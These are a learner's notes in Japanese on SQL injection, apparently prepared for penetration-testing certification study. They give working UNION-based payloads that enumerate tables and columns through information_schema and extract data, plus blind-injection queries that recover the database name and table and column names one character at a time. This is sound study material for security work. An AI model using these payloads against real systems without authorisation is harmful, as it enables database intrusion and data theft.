###### DBの構成情報とは？それが必要な理由

- SQLiの脆弱性を悪用するには、DBの以下の情報を探索する必要がある。
	- RDBMSソフトウェアの種類とバージョン
	- DBが含むテーブルとカラム

## RDBの種類とバージョン特定

- 前提条件として、カラム数、抽出したいデータ型とそれに一致するカラムのデータ型がわかっていること。[2. SQLi UNION攻撃](2.%20SQLi%20UNION攻撃.md#UNION攻撃の準備)

## 名前やテーブル、カラム名の列挙

- 前提条件として、「RDBの種類」、カラム数、抽出したいデータ型とそれに一致するカラムのデータ型がわかっていること。[2. SQLi UNION攻撃](2.%20SQLi%20UNION攻撃.md#UNION攻撃の準備)
- [SQLi cheet sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)のDatabase Cotents参照
- ==⚠️==：RDBの種類によってコメントアウト形式などの文法が異なる可能性がある
- Cheet sheetのように==`SELECT *`が不可だったら、それぞれのRDBのinformation_schemaに存在するカラムを直接指定すること==
#### 具体例

- 例えば、カラム数が2で2つともデータ型の場合、かつ、RDBの種類がPostgreSQLの場合

###### 1. テーブル名を割り出す

- ==カラムが複数== -> `*`は使用不可 -> "information_schema.tables postgresql" 等と検索して、一般的なカラム名を知る。
	- information_schemaのカラム名はRDBの種類ごとに統一されてる。
	- PostgreSQLのinformation_schemaのカラム名([参考](https://www.postgresql.jp/document/8.1/html/infoschema-columns.html))
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables
```

###### 2. 判別したテーブル名の中で興味深いテーブルのカラム名を割り出す
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = '[TABLE_NAME]'
```

###### 3. 情報を抽出
```sql
' UNION SELECT [clm_name1],[clm_name2] FROM [TABLE_NAME]
```

###### 以下、OSCPのノートからコピー

- Blind SQLiなので、直接的に結果が返ってこない。そのため1文字ずつ明らかにする必要がある。

1. DBの名前
```SQL
' UNION SELECT NULL,NULL,NULL where database() like '%';--
```
- `%`はワイルドカードですべてに一致するので、これでtrueになるか判別
- `%`を`a%`に変えてfalseになるかtrueになるか判断。trueになった文字列を残し次の桁に移る
- a-zを入力して==1文字ずつ明らかにする==

2. テーブル名
```SQL
' UNION SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_schema = '[DBName]' and table_name like 'a%';--
```
- テーブル名も同じく1文字ずつ明らかにする。
- `[DBName]`には1でわかったDBの名前を入れる

3. カラム名
```SQL
' UNION SELECT NULL,NULL,NULL FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='[DBName]' and TABLE_NAME='[TableName]' and COLUMN_NAME like 'a%';
```
- カラム名も同様に1文字ずつ

- カラム名が見つかったら、同じカラム名を何度も検出しないようにする(例:idというカラムが見つかったとき)
```SQL
' UNION SELECT NULL,NULL,NULL FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='[DBName]' and TABLE_NAME='[TableName]' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
```
